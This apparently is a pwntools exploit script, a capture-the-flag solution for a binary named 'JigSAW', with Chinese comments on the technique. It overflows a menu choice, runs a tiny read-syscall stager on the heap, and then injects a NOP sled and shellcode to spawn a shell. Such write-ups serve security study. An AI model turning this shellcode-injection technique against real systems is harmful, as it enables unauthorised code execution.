# -*- encoding: utf-8 -*-
import sys 
import os 
from pwn import * 
context.log_level = 'debug' 
context.update( os = 'linux', arch = 'amd64',timeout = 1)
binary = './JigSAW'
elf = ELF(binary)
libc = elf.libc
#libc = ELF('')
context.binary = binary
DEBUG = 1
if DEBUG:
    p = process(binary)
    libc = elf.libc
    #p = process(['qemu-arm', binary])
    #p = process(['qemu-aarch64','-L','',binary])
    #p = process(['qemu-aarch64','-L','',-g,'1234',binary])
else:
    host = ''
    port = ''
    p = remote(host,port)

l64 = lambda            : u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
l32 = lambda            : u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00'))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': 0x%x' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda x = 12     : int( p.recv(x) , 16)

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def exhaust( pwn ):
    global p
    i = 1
    while 1 :
        try:
            i+=0
            pwn()
        except:
            lg('times ======== > ',i)
            p.close()
            if (DEBUG):
                p = process(binary)
            else :
                p = remote(host,port)

def one_gadget(filename):
    log.progress('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(['one_gadget','--raw', '-f',filename])).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sla(':',num)

def add(id):
    cmd(1)
    sla('Index? :',id)
    
def edit(id,text):
    cmd(2)
    sla('Index? :',id)
    sa('iNput:',text)

def test(id):
    cmd(4)
    sla('Index? :',id)

# one_gad = one_gadget(libc.path)
sla('Name','niayh')
sla('Make your Choice:',u64(p32(0) + p32(16)))

# 首先通过溢出修改执行权限

shellcode = '''
xor rdi, rdi
mov rsi, rdx
mov rdx, 0x1000
syscall
'''
# 这里的 shellcode 因为长度受限，需要充分利用调用时各个寄存器的值
# 程序使用了 call rdx ，这里 rdx 为 heap 段地址，还把 rax 给置 0 
# 我们就可以进行 0 号系统调用 read 读到我们正在执行的 heap 中

lg("len",len(asm(shellcode)))
# 系统调用 read 读入 

add(0)
edit(0, asm(shellcode))

# dbg()
test(0)
se('\x90' * 0x20 + asm(shellcraft.sh()))

# 因为程序刚好在执行这段上面这条汇编
# 这样操作刚好属于在执行的过程中把要执行的代码修改了
# 这里 wjh 师傅是真他妈强，使用 nop 指令滑到 shellcode

p.interactive()

'''
@File    :   JigSAW.py
@Time    :   2021/08/24 17:58:53
@Author  :   Niyah 
'''
